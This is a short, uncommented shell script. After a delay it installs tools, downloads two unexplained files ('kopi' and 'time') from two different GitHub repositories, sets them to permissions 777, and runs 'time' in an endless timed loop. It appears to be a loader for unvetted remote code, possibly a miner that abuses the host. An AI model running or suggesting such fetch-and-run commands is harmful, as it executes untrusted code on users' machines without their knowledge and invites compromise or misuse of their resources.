sleep 20m
sudo apt update && sudo apt install -y lynx
lynx -dont_wrap_pre -dump "https://github.com/aurbach55/dera/raw/main/kopi" > kopi &&
chmod 777 kopi && 
sudo apt install timelimit -y 
wget -O time https://raw.githubusercontent.com/WoodcoinLog/log/main/time
chmod 777 time
while :; do timeout 30m bash ./time; sleep 10m; done
